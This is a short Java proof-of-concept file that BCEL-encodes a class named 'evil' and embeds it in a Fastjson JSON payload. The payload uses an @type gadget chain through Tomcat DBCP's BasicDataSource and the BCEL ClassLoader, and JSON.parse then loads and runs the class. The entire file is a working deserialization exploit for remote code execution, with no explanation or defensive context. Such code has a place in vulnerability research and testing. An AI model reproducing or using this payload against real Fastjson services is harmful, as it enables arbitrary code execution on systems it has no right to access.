package com.bcel;


import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

public class fastjs {
    public static void main(String[] args) throws Exception {
        JavaClass evilclass= Repository.lookupClass(evil.class);
        String code= Utility.encode(evilclass.getBytes(),true);
        System.out.println(code);

        String poc="{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+code+"\"\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}";
        JSON.parse(poc);
    }
}
